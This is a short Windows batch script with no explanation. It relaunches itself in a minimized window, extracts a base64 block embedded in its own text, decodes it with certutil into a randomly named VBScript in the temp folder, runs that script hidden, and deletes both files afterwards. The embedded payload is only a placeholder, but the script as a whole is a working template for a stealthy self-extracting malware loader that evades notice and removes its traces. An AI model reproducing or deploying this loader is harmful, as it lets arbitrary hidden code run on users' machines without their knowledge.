@echo off
if /I "%~1"=="_h" goto main
start "" /min cmd /c "%~f0" _h
exit /b
:main
setlocal EnableExtensions EnableDelayedExpansion
set "B64F=%TEMP%\h%RANDOM%%RANDOM%.b64"
set "VBSF=%TEMP%\h%RANDOM%%RANDOM%.vbs"
set "CAP=0"
>"%B64F%" (
  for /f "usebackq delims=" %%L in ("%~f0") do (
    if "!CAP!"=="1" (
      if /I "%%L"=="::END_B64::" (
        set "CAP=0"
      ) else (
        echo(%%L
      )
    )
    if /I "%%L"=="::BEGIN_B64::" set "CAP=1"
  )
)
certutil -f -decode "%B64F%" "%VBSF%" >nul 2>&1
del /f /q "%B64F%" >nul 2>&1
start "" /min /wait "%VBSF%"
set "EC=!ERRORLEVEL!"
del /f /q "%VBSF%" >nul 2>&1
endlocal & exit /b %EC%
::BEGIN_B64::
0102
::END_B64::
